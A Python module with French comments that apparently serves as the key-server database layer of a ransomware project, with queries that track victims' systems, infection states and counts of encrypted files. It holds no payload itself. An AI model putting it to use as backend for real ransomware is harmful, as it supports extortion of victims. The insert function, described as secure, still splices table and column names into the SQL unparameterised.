import sqlite3

# Constantes
DB_FILENAME = '../serveur_cles/data/victims.sqlite'


def connect_db(db=DB_FILENAME):
    """
    Initialise la connexion vers la base de données
    :param db: chemin vers le fichier de base de données
    :return: connexion établie ou None
    """
    try:
        con = sqlite3.connect(db)
        return con
    except sqlite3.Error as e:
        print(f"Erreur lors de la connexion à la base de données: {e}")
        return None


def insert_data(conn, table, items, data):
    """
    Insère des données de manière sécurisée
    :param conn: connexion active à la BDD
    :param table: nom de la table
    :param items: liste des champs
    :param data: liste des valeurs à insérer
    """
    cur = conn.cursor()
    champs = ", ".join(items)
    placeholders = ", ".join("?" for _ in data)
    query = f"INSERT INTO {table} ({champs}) VALUES ({placeholders})"
    cur.execute(query, data)
    conn.commit()


def select_data(conn, query, params=()):
    """
    Exécute une requête SELECT sécurisée avec des paramètres
    :param conn: connexion active
    :param query: requête SQL (avec ? pour les paramètres)
    :param params: tuple de valeurs à injecter dans la requête
    :return: résultats du SELECT
    """
    cur = conn.cursor()
    cur.execute(query, params)
    return cur.fetchall()


def get_list_victims(conn):
    """
    Récupère la liste des victimes avec leur état actuel et nombre de fichiers chiffrés
    :param conn: connexion active à la BDD
    :return: liste des victimes
    """
    query = """
        SELECT 
            v.hash, 
            v.OS, 
            v.disks, 
            s.state,
            (
                SELECT e.nb_files 
                FROM encrypted e 
                WHERE e.hash_victim = v.hash 
                ORDER BY e.datetime DESC 
                LIMIT 1
            ) AS nb_files
        FROM victims v
        INNER JOIN states s ON v.hash = s.hash_victim
        WHERE s.datetime = (
            SELECT MAX(s2.datetime)
            FROM states s2
            WHERE s2.hash_victim = v.hash
        )
    """
    return select_data(conn, query)


def get_list_history(conn, id_victim):
    """
    Retourne l'historique des états d'une victime spécifique
    :param conn: connexion active
    :param id_victim: identifiant de la victime
    :return: historique sous forme de liste de tuples
    """
    query = """
        SELECT 
            s.hash_victim, 
            s.datetime, 
            s.state, 
            COALESCE(e.nb_files, 0) AS nb_files
        FROM states s
        LEFT JOIN encrypted e ON s.datetime = e.datetime AND s.hash_victim = e.hash_victim
        WHERE s.hash_victim = ?
        ORDER BY s.datetime ASC
    """
    return select_data(conn, query, (id_victim,))
